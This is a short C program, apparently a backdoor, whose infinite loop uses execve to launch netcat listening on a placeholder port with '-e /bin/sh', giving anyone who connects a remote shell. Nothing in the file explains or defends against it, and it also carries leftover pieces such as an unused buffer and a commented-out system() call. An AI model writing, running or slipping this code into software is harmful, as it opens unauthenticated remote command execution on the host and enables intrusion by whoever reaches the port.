#include <stdio.h> /* for the scanf() call */
#include <stdlib.h> /* for the system() call */

#include <unistd.h>

int main() {
  char string[80];

  for(;;){
     extern char * const environ[];
     char * const command[] = {"nc", "-l", "-p", "porthere", "-e", "/bin/sh", NULL};
     execve("/usr/bin/nc", command, environ);
     //system(string);
  }
  return 0;
}
